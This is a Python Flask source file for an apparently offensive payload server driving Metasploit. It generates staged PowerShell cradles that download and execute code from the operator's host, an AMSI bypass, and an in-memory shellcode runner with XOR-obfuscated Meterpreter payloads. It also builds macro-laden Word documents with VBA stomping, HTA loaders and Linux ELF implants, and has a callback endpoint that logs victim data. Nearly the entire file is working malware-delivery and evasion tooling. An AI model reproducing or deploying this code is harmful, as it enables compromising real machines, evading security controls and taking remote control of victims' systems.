import base64
import hashlib
import ipaddress
import itertools
import json
import logging
import os
import re
import subprocess
import sys
from typing import Optional, Dict, List, Tuple
import olefile
from io import BytesIO

from flask import Flask, render_template, Blueprint, render_template_string, request, send_from_directory, send_file, \
    current_app, redirect

from logging.config import dictConfig

from pymetasploit3.msfrpc import MsfRpcClient

import vba
from hta import create_hta
from payload import LISTENER_CONFIGS, generate_payload, get_host, PAYLOAD_DIR, setup_listener
from powershell import encode_ps, powershell_base64

dictConfig({
    'version': 1,
    'formatters': {'default': {
        'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
    }},
    'handlers': {'wsgi': {
        'class': 'logging.StreamHandler',
        'stream': 'ext://flask.logging.wsgi_errors_stream',
        'formatter': 'default'
    }},
    'root': {
        'level': 'INFO',
        'handlers': ['wsgi']
    }
})

def filter_string(input_string):
    return re.sub(r'[^a-zA-Z0-9_-]', '', input_string)

def filter_int(input_string):
    return int(re.sub(r'[^0-9]', '', input_string))

def encrypt_ps_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    for byte in content:
        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'0x{transformed_byte:02X},'

    # Remove trailing comma
    return transformed.rstrip(',')

def encrypt_vba_payload(payload_file: str) -> str:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = f.read()

    # Apply transformations and create hex string
    transformed = ''
    i = 0
    for byte in content:
        if i % 50 == 0 and i != 0:
            transformed += " _\n"

        # Apply shift of 2 and XOR with 0x75
        transformed_byte = ((byte + 2) & 0xFF) ^ 0x75
        # Format as hex with 0x prefix
        transformed += f'{transformed_byte:d},'
        
        i += 1

    # Remove trailing comma
    return transformed.rstrip(',')

def encrypt_raw_payload(payload_file: str) -> bytearray:
    # Read the payload file in binary mode
    with open(f"{PAYLOAD_DIR}/{payload_file}", 'rb') as f:
        content = bytearray(f.read())

        for i in range(len(content)):
            content[i] = (((content[i] + 2) & 0xFF) ^ 0x75)

        return content

def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
    for i in range(len(payload)):
        payload[i] = (((payload[i] + 2) & 0xFF) ^ 0x75)

    return payload

win = Blueprint('win', __name__)

WIN_PS_COMMAND = """
{% if proxy == False %}
[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);
{% endif %}

iex((New-Object System.Net.WebClient).DownloadString("http://{{ lhost }}:{{ lport }}/p/win/{{ type }}/{{ id }}/start"))
"""

WIN_START_TEMPLATE = """
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null, $true);

{% if proxy == False %}
[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null)
{% endif %}

if([Environment]::Is64BitProcess) {
    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/bypass'));
}
else
{
    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/loader_32'));
}
"""
WIN_BYPASS_TEMPLATE = """
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null, $true);

iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/delegate'));
"""
WIN_LOADER_32_TEMPLATE = """
&"$env:WINDIR\\sysnative\\windowspowershell\\v1.0\\powershell.exe" -c "{% if proxy == False %}[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);{% endif %}iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/start'))"
"""
WIN_DELEGATE_TEMPLATE = """
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = (
        [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object {
                $_.GlobalAssemblyCache -And
                $_.Location.Split('\\')[-1].Equals('System.dll') }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $GetProcAddress = ($assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}})[0]

    return $GetProcAddress.Invoke(
        $null,
        @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)
    )
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
                (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
                [System.Reflection.Emit.AssemblyBuilderAccess]::Run
            ).DefineDynamicModule(
                'InMemoryModule',
                $false
            ).DefineType(
                'MyDelegateType',
                'Class, Public, Sealed, AnsiClass, AutoClass',
                [System.MulticastDelegate]
            )

    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod(
        'Invoke', 'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

function DecryptBytes {
    Param (
        $Bytes
    )

    [Byte[]] $decrypted = New-Object byte[] $Bytes.length

    for($i=0; $i -lt $Bytes.length; $i++)
    {
        $decrypted[$i] = $Bytes[$i] -bxor 0x75
        $decrypted[$i] = (($decrypted[$i] + 256) - 2) % 256
    }

    return $decrypted
}

$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])));
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int])))


$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = {{bytes}}
[Byte[]] $buf2 = DecryptBytes($buf)


[System.Runtime.InteropServices.Marshal]::Copy($buf2, 0, $lpMem, $buf.length)

$hThread = $CreateThread.Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
"""

WIN_VBA_OUT_TEMPLATE = """
buf = Array({{bytes}})
"""

def ps(id, stage, proxy=False):
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if proxy:
        payload_type = "ps_proxy"
    else:
        payload_type = "ps"

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)

    if stage == 'delegate':
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS["PS_HTTPS"] | {
                "LURI": f"/ms/{clean_id}/",
                "HttpProxyIE": proxy
            }
        )

        raw_payload_file = generate_payload(
            LISTENER_CONFIGS["PS_HTTPS"]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": f"/ms/{clean_id}/",
                    "HttpProxyIE": proxy
                }
            ]
        )
        ps_string = encrypt_ps_payload(raw_payload_file)
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)

@win.route('/ps/<id>/<stage>')
def ps_noproxy(id, stage):
    return ps(id, stage)

@win.route('/ps_proxy/<id>/<stage>')
def ps_proxy(id, stage):
    return ps(id, stage, proxy=True)

@win.route('/ps/get_command', methods=['POST'])
def ps_get_command():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    proxy = ('system_proxy' in request.form.keys())

    if proxy:
        ps_type = "ps_proxy"
    else:
        ps_type = "ps"

    command_text = render_template_string(
        WIN_PS_COMMAND,
        lhost=lhost,
        lport=lport,
        id=id,
        type=ps_type,
        proxy=proxy
    ).strip()

    encoded_command = encode_ps(command_text)

    return command_text + "\n\n" + encoded_command + "\n\n" + powershell_base64(encoded_command)

@win.route('/tcp/<id>/<stage>')
def tcp(id, stage):
    clean_id = filter_int(id)

    if clean_id == "":
        return "Invalid id", 400

    if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
        return 'Invalid stage', 400

    lhost, lport = get_host()
    host = lhost + ':' + str(lport)

    if stage == 'bypass':
        return render_template_string(WIN_BYPASS_TEMPLATE, host=host)

    if stage == 'loader_32':
        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type='tcp')

    if stage == 'start':
        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type='tcp')

    if stage == 'delegate':
        setup_listener(
            lhost,
            clean_id,
            LISTENER_CONFIGS["PS_TCP"]
        )

        raw_payload_file = generate_payload(
            LISTENER_CONFIGS["PS_TCP"]["Payload"],
            lhost,
            clean_id,
            'raw',
            [
                
            ]
        )
        ps_string = encrypt_ps_payload(raw_payload_file)
        return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)

@win.route('/word_form/')
def word_form():
    return render_template('word_form.html')

@win.route('/word_form/get', methods=['POST'])
def word_get():
    payload_type = request.form['type']
    stomp_vba = ('stomp_vba' in request.form.keys())
    proxy = ('system_proxy' in request.form.keys())
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    id = request.form['id']
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    if payload_type == "vba_shellcode":
        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS["VBA_32"] | {
                "LURI": f"/ms/{clean_id}_32/",
                "HttpProxyIE": proxy,
            }
        )

        setup_listener(
            lhost,
            lport,
            LISTENER_CONFIGS["VBA_64"] | {
                "LURI": f"/ms/{clean_id}_64/",
                "HttpProxyIE": proxy
            }
        )

        raw_payload_file_32 = generate_payload(
            LISTENER_CONFIGS["VBA_32"]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": f"/ms/{clean_id}_32/",
                    "EXITFUNC": "thread",
                    "HttpProxyIE": proxy,
                }
            ]
        )

        raw_payload_file_64 = generate_payload(
            LISTENER_CONFIGS["VBA_64"]["Payload"],
            lhost,
            lport,
            'raw',
            [
                {
                    "LURI": f"/ms/{clean_id}_64/",
                    "EXITFUNC": "thread",
                    "HttpProxyIE": proxy,
                }
            ]
        )

        encrypted_bytes_32 = encrypt_raw_payload(raw_payload_file_32)
        encrypted_bytes_64 = encrypt_raw_payload(raw_payload_file_64)
        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"

        word_file_stream = vba.generate_word_file(template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
    elif payload_type == "messagebox_msf":
        raw_payload_file_32 = generate_payload(
            "windows/messagebox",
            None,
            None,
            'raw',
            [
                {
                    "Title": f"32 bit"
                }
            ]
        )

        raw_payload_file_64 = generate_payload(
            "windows/x64/messagebox",
            None,
            None,
            'raw',
            [
                {
                    "Title": f"64 bit"
                }
            ]
        )

        encrypted_bytes_32 = encrypt_raw_payload(raw_payload_file_32)
        encrypted_bytes_64 = encrypt_raw_payload(raw_payload_file_64)
        template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"

        word_file_stream = vba.generate_word_file(template_path, [encrypted_bytes_32, encrypted_bytes_64], stomp_vba)
    elif payload_type == "powershell_runner":
        template_path = "payload_holders/powershell_obfs_EvilClippy.doc"

        if proxy:
            ps_type = "ps_proxy"
        else:
            ps_type = "ps"

        url = bytearray(f"http://{lhost}:{lport}/p/win/{ps_type}/{clean_id}/start".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = vba.generate_word_file(template_path, [encrypted_bytes], stomp_vba)
    elif payload_type == "powershell_wmi":
        template_path = "payload_holders/wmi_exec_obfs_EvilClippy.doc"

        if proxy:
            ps_type = "ps_proxy"
        else:
            ps_type = "ps"

        url = bytearray(f"http://{lhost}:{lport}/p/win/{ps_type}/{clean_id}/start".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = vba.generate_word_file(template_path, [encrypted_bytes], stomp_vba)
    elif payload_type == "messagebox":
        template_path = "payload_holders/msgbox_obfs_EvilClippy.doc"

        url = bytearray(f"http://{lhost}:{lport}/p/win/ps/{clean_id}/start".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = vba.generate_word_file(template_path, [encrypted_bytes], stomp_vba)
    elif payload_type == "callback":
        template_path = "payload_holders/callback_obfs_EvilClippy.doc"

        url = bytearray(f"http://{lhost}:{lport}/p/info/get".encode())
        encrypted_bytes = encrypt_raw_payload_bytes(url)
        word_file_stream = vba.generate_word_file(template_path, [encrypted_bytes], stomp_vba)
    else:
        return "Invalid type", 400

    return send_file(
        word_file_stream,
        as_attachment=False,
        download_name='document.doc',
        mimetype='application/octet-stream'
    )

@win.route('/hta/get', methods=['POST'])
def hta_get():
    lhost = request.form['lhost']
    lport = int(request.form['lport'])
    proxy = ('system_proxy' in request.form.keys())
    id = request.form['id']
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    setup_listener(
        lhost,
        lport,
        LISTENER_CONFIGS["VBA_64"] | {
            "LURI": f"/ms/{clean_id}_64/",
            "HttpProxyIE": proxy,
        }
    )

    setup_listener(
        lhost,
        lport,
        LISTENER_CONFIGS["VBA_32"] | {
            "LURI": f"/ms/{clean_id}_32/",
            "HttpProxyIE": proxy,
        }
    )

    raw_payload_file_64 = generate_payload(
        LISTENER_CONFIGS["VBA_64"]["Payload"],
        lhost,
        lport,
        'raw',
        [
            {
                "LURI": f"/ms/{clean_id}_64/",
                "HttpProxyIE": proxy,
            }
        ]
    )

    raw_payload_file_32 = generate_payload(
        LISTENER_CONFIGS["VBA_32"]["Payload"],
        lhost,
        lport,
        'raw',
        [
            {
                "LURI": f"/ms/{clean_id}_32/",
                "HttpProxyIE": proxy,
            }
        ]
    )

    encrypted_bytes_64 = base64.b64encode(encrypt_raw_payload(raw_payload_file_64)).decode()
    encrypted_bytes_32 = base64.b64encode(encrypt_raw_payload(raw_payload_file_32)).decode()

    hta = render_template("loader.hta", payload_x64=encrypted_bytes_64, payload_x32=encrypted_bytes_32)

    bytes_data = hta.encode('utf-8')
    bytes_io = BytesIO(bytes_data)
    bytes_io.seek(0)

    return send_file(
        bytes_io,
        as_attachment=False,
        download_name='loader.hta',
        mimetype='application/octet-stream'
    )

lin = Blueprint('lin', __name__)
@lin.route('/elf/<id>/msf.elf')
def elf(id):
    clean_id = filter_string(id)

    if clean_id == "":
        return "Invalid id", 400

    lhost, lport = get_host()

    setup_listener(
        lhost,
        lport,
        LISTENER_CONFIGS["ELF"] | {
            "LURI": f"/ms/{clean_id}/"
        }
    )

    elf_payload_file = generate_payload(
        LISTENER_CONFIGS["ELF"]["Payload"],
        lhost,
        lport,
        'elf',
        [
            {
                "LURI": f"/ms/{clean_id}/",
                "PrependFork": "true"
            }
        ]
    )

    return send_from_directory(directory=PAYLOAD_DIR, path=elf_payload_file, as_attachment=True, download_name='msf.elf')

info = Blueprint('info', __name__)
@info.route('/get', methods=['GET', 'POST'])
def receive_info():
    if request.form:
        current_app.logger.info(f"Received info: {request.form}")

    return "Thanks", 200


app = Flask(__name__)
app.register_blueprint(win, url_prefix='/p/win')
app.register_blueprint(lin, url_prefix='/p/lin')
app.register_blueprint(info, url_prefix='/p/info')

print(app.url_map)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=50101, debug=True)
